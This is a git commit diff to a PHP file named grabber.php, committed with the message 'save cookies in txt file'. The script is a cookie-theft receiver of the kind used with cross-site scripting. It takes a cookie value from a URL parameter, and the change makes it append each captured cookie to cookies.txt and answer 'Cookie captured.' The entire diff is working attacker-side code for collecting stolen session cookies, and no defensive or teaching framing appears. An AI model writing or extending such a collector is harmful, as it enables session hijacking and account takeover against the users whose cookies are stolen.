91d112781a86a01b51946ae3bdfa94e264f985c6
Nguyen Tri Duc <145568749+triduccc@users.noreply.github.com>
2026-05-24 14:33:21 +0700

    save cookies in txt file

--- grabber.php
+++ grabber.php
@@ -2,9 +2,15 @@
 
 if (isset($_GET["cookie"])) {
 
-    echo "<h1>Captured Cookie</h1>";
+    $cookie = $_GET["cookie"];
 
-    echo $_GET["cookie"];
+    file_put_contents(
+        "cookies.txt",
+        $cookie . PHP_EOL,
+        FILE_APPEND
+    );
+
+    echo "Cookie captured.";
 
 } else {
 
